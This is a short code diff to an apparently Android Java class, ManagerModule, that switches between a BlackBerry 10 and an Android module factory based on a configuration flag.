@@ -16,6 +16,8 @@ import com.android.dvci.conf.ConfModule;
 import com.android.dvci.interfaces.IncrementalLog;
 import com.android.dvci.module.BaseModule;
 import com.android.dvci.module.FactoryModule;
+import com.android.dvci.module.FactoryModuleAndroid;
+import com.android.dvci.module.FactoryModuleBB10;
 import com.android.dvci.util.Check;
 import com.android.dvci.util.Utils;
 
@@ -40,7 +42,11 @@ public class ManagerModule extends Manager<BaseModule, String, String> {
 			synchronized (ManagerModule.class) {
 				if (singleton == null) {
 					singleton = new ManagerModule();
-					singleton.setFactory(new FactoryModule());
+					if(Cfg.BB10) {
+						singleton.setFactory(new FactoryModuleBB10());
+					}else{
+						singleton.setFactory(new FactoryModuleAndroid());
+					}
 				}
 			}
 		}
